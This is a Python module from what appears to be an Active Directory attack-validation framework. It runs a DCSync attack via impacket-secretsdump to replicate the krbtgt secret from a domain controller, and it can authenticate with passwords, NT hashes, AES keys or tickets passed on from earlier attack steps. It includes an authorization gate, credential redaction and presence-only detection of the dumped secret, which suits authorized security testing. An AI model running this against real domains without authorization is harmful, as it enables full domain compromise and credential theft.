"""DCSync terminal module (``b1``) validation executor -- FULL (N1), synchronous.

The reusable, NON-mutating Domain-Admin terminal the chaining engine (C) invokes
once a front has produced replication-capable credentials: with replication
rights (held only by a DA-equivalent), DRSUAPI-replicate the krbtgt secret from
the DC -- success IS Domain Admin (research 1).

    impacket-secretsdump -just-dc-user krbtgt -dc-ip <dc> <auth>@<dc_host>
    terminal ok  <=> the krbtgt replication marker is seen

The operator/credential context (``-k`` ticket, NT hash, or password) comes from
``ctx.config`` -- the DA-equivalent context the chaining engine supplies. This is
a replication READ: ``mutating=False``, no rollback. ``verified_recipe=True``
(deterministic read).

Secrets rule: the krbtgt hash is a SECRET -- it is PRESENCE-detected only (the
matched content is never captured into a variable or the receipt); the proof
token is over public parts only (``DCSYNC``, domain, dc, ``krbtgt_replicated``).

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): DCSYNC keys on
``{host_id}`` -- ``target_identity`` resolves the (overridable) ``dc_host``
through ``config.host_aliases`` (vulnerable set dc01/dc02/dc03).

Capability-state metadata (toward C): ``pre={DC_TGT, DA_CREDS}`` (either state
satisfies it -- a DC-context TGT from a front, OR pre-supplied DA creds),
``eff={KRBTGT, S_DA}``. Review H5: a DCSYNC receipt ALONE proves only "DA given
replication creds"; C may NOT hand this module pre-supplied ``DA_CREDS`` and call
it an escalation -- the DA claim is the composed front+DCSYNC receipt pair.

UNVERIFIED ASSUMPTION (pin in-lab, mirroring unconstrained_deleg.py): the
secretsdump DCSync success marker (``krbtgt:<rid>`` / "Dumping Domain
Credentials" / a ``:::`` hash line). If the real wording differs the chain gets
no positive marker and honestly reports not-proved -- it never fabricates a dump.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .. import states
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)
from .coercion import _short_name


# ---- UNVERIFIED DCSync success marker (see module docstring) ------------------
# Replication returned the krbtgt object: a krbtgt entry, the dump banner, or a
# secretsdump hash line. Presence only -- the matched content (a real secret) is
# NEVER captured into a variable or the receipt.
_RE_DCSYNC_KRBTGT = re.compile(
    r"(krbtgt:\d|Dumping Domain Credentials|Kerberos keys grabbed|"
    r"krbtgt:[0-9a-f]{32}|[^\s:]+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::)", re.I)


class DCSyncExecutor(ValidationExecutor):
    technique = "DCSYNC"
    technique_class = "dcsync"
    terminal_kind = "replication_dump"
    mutating = False
    verified_recipe = True
    # Capability-state metadata (toward C): either a DC-context TGT (from a front)
    # OR pre-supplied DA creds satisfies it; it establishes krbtgt + DA control.
    pre = frozenset({states.DC_TGT, states.DA_CREDS})
    eff = frozenset({states.KRBTGT, states.S_DA})
    recipe_ref = ("N1 DCSYNC (b1) = impacket-secretsdump -just-dc-user krbtgt "
                  "<ctx creds/hash/-k>@<dc_host> ; terminal = krbtgt replicated "
                  "(read-only, no rollback; the reusable DA terminal C composes)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        dc_host = finding.host or (finding.entity or {}).get("host") or ctx.config.dc_ip
        return [
            ParamSpec(
                name="dc_host", kind="target_host",
                description="The DC to DRSUAPI-replicate the krbtgt secret from. Use "
                            "its hostname.",
                recommended=dc_host,
                rationale="The host of the aranum DC finding (else the configured DC).",
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # DCSYNC facet keys on {host_id}: resolve the (overridable) DC host.
        dc_host = (params["dc_host"].value if "dc_host" in params else None) \
            or finding.host or ctx.config.dc_ip
        return ctx.config.resolve_target_identity(dc_host)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        return [
            f"impacket-secretsdump -just-dc-user krbtgt -dc-ip {ctx.config.dc_ip} "
            f"<ctx creds/hash/-k>@{v['dc_host']}  (DCSync; replication_dump, read-only)",
        ]

    # ---------------------------------------------------------------- auth argv
    def _secretsdump_argv(self, cfg, dc_host: str,
                          input_caps: dict | None = None) -> list[str]:
        """Build the secretsdump DCSync argv.

        **Composed (review B1):** a THREADED credential from an upstream front
        takes precedence over ``cfg`` -- this is what makes ``a1+b1`` real.
        ``input_caps`` (populated by the engine on this edge's context) may carry:
          * ``ccache``   -- a captured TGT. The engine also sets ``KRB5CCNAME`` in
            ``ctx.env``; here we authenticate with ``-k -no-pass`` AS the front's
            ``principal`` (e.g. ``dc01$``), NOT the operator user -- without this
            the DCSync would ignore the ccache and auth as the wrong identity.
          * ``nt_hash`` / ``aes_key`` -- a recovered key for ``principal``
            (shadow-creds / relay). Rides ``-hashes`` / ``-aesKey`` so
            :func:`redact_argv` masks it; the engine keeps it in-memory only.

        **Standalone:** credential mode follows ``cfg`` exactly as before (NT hash,
        AES key, password, else ``-k -no-pass``). Secrets ride ``-hashes`` / the
        ``:pass`` target so :func:`redact_argv` masks them.
        """
        caps = input_caps or {}
        argv = ["impacket-secretsdump", "-just-dc-user", "krbtgt", "-dc-ip", cfg.dc_ip]
        threaded_principal = caps.get("principal")
        if caps.get("ccache"):               # composed: auth as the front's principal via KRB5CCNAME
            user = threaded_principal or cfg.username or ""
            argv += ["-k", "-no-pass"]
            argv.append(f"{cfg.domain}/{user}@{dc_host}")
            return argv
        if caps.get("nt_hash"):              # composed: recovered NT hash for a principal
            user = threaded_principal or cfg.username or ""
            argv += ["-hashes", caps["nt_hash"]]
            argv.append(f"{cfg.domain}/{user}@{dc_host}")
            return argv
        if caps.get("aes_key"):              # composed: recovered AES key for a principal
            user = threaded_principal or cfg.username or ""
            argv += ["-aesKey", caps["aes_key"], "-k"]
            argv.append(f"{cfg.domain}/{user}@{dc_host}")
            return argv
        # standalone: operator-supplied credential mode (unchanged).
        user = cfg.username or ""
        if cfg.nt_hash:
            argv += ["-hashes", cfg.nt_hash]
            target = f"{cfg.domain}/{user}@{dc_host}"
        elif cfg.aes_key:
            argv += ["-aesKey", cfg.aes_key, "-k"]
            target = f"{cfg.domain}/{user}@{dc_host}"
        elif cfg.password is not None:
            target = f"{cfg.domain}/{user}:{cfg.password}@{dc_host}"
        else:
            argv += ["-k", "-no-pass"]
            target = f"{cfg.domain}/{user}@{dc_host}"
        argv.append(target)
        return argv

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        dc_host = v["dc_host"]
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode if res else None, note=note))

        # Gate the replication read (sensitive, though non-mutating).
        verdict = ctx.authorizer.authorize("dcsync", {"dc_host": dc_host})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "dcsync"
            errors.append("gate_denied:dcsync")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "dcsync"

        # DCSync: presence-only -- test whether the krbtgt replicated, never store it.
        # Composed: thread the front's credential (input_caps) + its KRB5CCNAME
        # (ctx.env) so this DCSync authenticates with what the front produced (B1).
        dcsync_argv = self._secretsdump_argv(cfg, dc_host, ctx.input_caps)
        run_env = dict(ctx.env) if ctx.env else None
        res = ctx.runner.run(dcsync_argv, env=run_env,
                             timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        dcsync_ok = bool(_RE_DCSYNC_KRBTGT.search((res.stdout or "") + (res.stderr or "")))
        record("dcsync", dcsync_argv, res, dcsync_ok,
               note="krbtgt replicated" if dcsync_ok else "no replication data")
        if not dcsync_ok:
            errors.append("dcsync_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=True,
            predicate=(f"DRSUAPI-replicated the krbtgt secret from {dc_host} via DCSync "
                       "(success is Domain Admin)"),
            proof_token=proof.proof_token("DCSYNC", cfg.domain, dc_host, "krbtgt_replicated"),
            extra={"dc": _short_name(dc_host), "replicated_object": "krbtgt"})
        return self._artifact(steps, gate, mutation, terminal_fact, True, errors)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
